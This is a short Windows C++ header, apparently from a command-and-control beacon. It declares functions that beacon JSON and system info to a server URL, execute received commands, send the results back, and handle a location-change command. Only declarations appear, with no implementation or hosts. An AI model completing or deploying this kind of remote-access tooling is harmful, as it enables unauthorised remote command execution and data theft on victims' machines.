#pragma once

#include <Windows.h>
#include <wininet.h>
#include "utils.h"

#pragma comment(lib, "wininet.lib")

extern char currentDirectory[MAX_PATH];
extern WCHAR url[MAX_PATH];
extern WCHAR sysinfoPath[MAX_PATH];
extern WCHAR beaconPath[MAX_PATH];
extern WCHAR resultPath[MAX_PATH];
extern WCHAR locationPath[MAX_PATH];

VOID InitCurDir();

// beaconing and handle the response
BOOL SendJson(const char* jsonData, const WCHAR* url, const WCHAR* beaconingPath, const WCHAR* resultPath=NULL);
BOOL ExecuteCommand(const char* command, char* result, DWORD resultSize);
BOOL SendResultToServer(const char* command, const char* result, const WCHAR* url, const WCHAR* resultPath);
BOOL HandleSetLocationCommand(const char* command, char* result, DWORD resultSize);